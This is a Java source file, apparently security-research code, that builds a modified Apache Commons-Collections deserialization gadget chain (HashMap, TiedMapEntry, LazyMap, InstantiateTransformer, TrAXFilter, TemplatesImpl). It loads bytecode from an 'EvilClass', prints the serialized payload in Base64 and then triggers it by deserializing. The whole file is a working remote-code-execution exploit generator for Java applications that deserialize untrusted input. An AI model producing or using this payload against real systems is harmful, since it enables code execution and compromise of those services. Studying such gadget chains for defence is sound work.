import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.ObjectInputStream;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

/*
    改造的cc链，该链不受jdk版本限制

    HashMap.readObject()
        TiedMapEntry.HashCode()
            TiedMapEntry.getValue()
                InstantiateTransformer.transform()
                    TrAXFilter(Templates)
                        TemplatesImpl.newTransformer
                            TemplatesImpl.getTransletInstance()
*/

public class MyHashMapCC {
    public static void main(String[] args) throws Exception{
        byte[] bytes = Util.getExpClassFileBytes("EvilClass");
        TemplatesImpl templates = new TemplatesImpl();
        Util.setValue(templates, "_name", "v");
        Util.setValue(templates, "_bytecodes", bytes);
        Util.setValue(templates, "_tfactory", new TransformerFactoryImpl());

        InstantiateTransformer fakeInstantiateTransformer = new InstantiateTransformer(new Class[]{}, new Object[]{});
        InstantiateTransformer instantiateTransformer = new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});

        HashMap innerMap = new HashMap();
        Map outerMap = LazyMap.decorate(innerMap, fakeInstantiateTransformer);

        TiedMapEntry entry = new TiedMapEntry(outerMap, String.class);

        HashMap expMap = new HashMap();
        expMap.put(entry, "foo");

        Util.setValue(outerMap, "factory", instantiateTransformer);
        Util.setValue(entry, "key", TrAXFilter.class);

        byte[] serial = Util.toSerial(expMap);
        System.out.println(new String(Base64.getEncoder().encode(serial)));

        ObjectInputStream inputStream = Util.fromSerial(serial);
        inputStream.readObject();
    }
}
